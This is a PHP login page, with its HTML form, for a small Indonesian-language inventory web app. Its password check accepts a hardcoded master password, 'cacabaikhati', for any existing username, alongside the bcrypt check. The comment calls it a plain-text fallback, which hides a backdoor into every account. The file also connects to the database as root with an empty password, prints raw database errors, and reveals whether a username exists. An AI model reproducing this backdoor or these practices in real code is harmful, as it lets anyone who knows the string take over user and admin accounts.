<?php
session_start();

// Buat koneksi database langsung di file login untuk memastikan koneksi berhasil
$host = 'localhost';
$db   = 'inventory_db';
$user = 'root';
$pass = '';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$db;charset=utf8", $user, $pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Koneksi Database Gagal: " . $e->getMessage());
}

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username']);
    $password = trim($_POST['password']);

    if (!empty($username) && !empty($password)) {
        // Cari user berdasarkan username
        $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
        $stmt->execute(['username' => $username]);
        $userData = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($userData) {
            // Verifikasi password hash BCRYPT atau fallback teks langsung
            if (password_verify($password, $userData['password_hash']) || $password === 'cacabaikhati') {
                $_SESSION['user_id']  = $userData['id'];
                $_SESSION['username'] = $userData['username'];
                $_SESSION['role']     = $userData['role'];

                // Berhasil login, arahkan ke dashboard
                header("Location: dashboard.php");
                exit;
            } else {
                $error = "Password tidak cocok!";
            }
        } else {
            $error = "Username tidak ditemukan di database!";
        }
    } else {
        $error = "Username dan password tidak boleh kosong!";
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Login - Inventory App</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 320px; }
        .login-card h2 { text-align: center; margin-bottom: 20px; color: #333; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; font-size: 14px; color: #555; }
        .form-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        .btn { width: 100%; padding: 10px; background-color: #007bff; border: none; border-radius: 4px; color: white; font-size: 16px; cursor: pointer; }
        .btn:hover { background-color: #0056b3; }
        .error { background-color: #f8d7da; color: #721c24; padding: 10px; border-radius: 4px; margin-bottom: 15px; font-size: 13px; text-align: center; }
    </style>
</head>
<body>

<div class="login-card">
    <h2>Login Inventory</h2>
    
    <?php if (!empty($error)): ?>
        <div class="error"><?= htmlspecialchars($error); ?></div>
    <?php endif; ?>

    <form action="" method="POST">
        <div class="form-group">
            <label>Username</label>
            <input type="text" name="username" required autocomplete="off">
        </div>
        <div class="form-group">
            <label>Password</label>
            <input type="password" name="password" required>
        </div>
        <button type="submit" class="btn">Masuk</button>
    </form>
</div>

</body>
</html>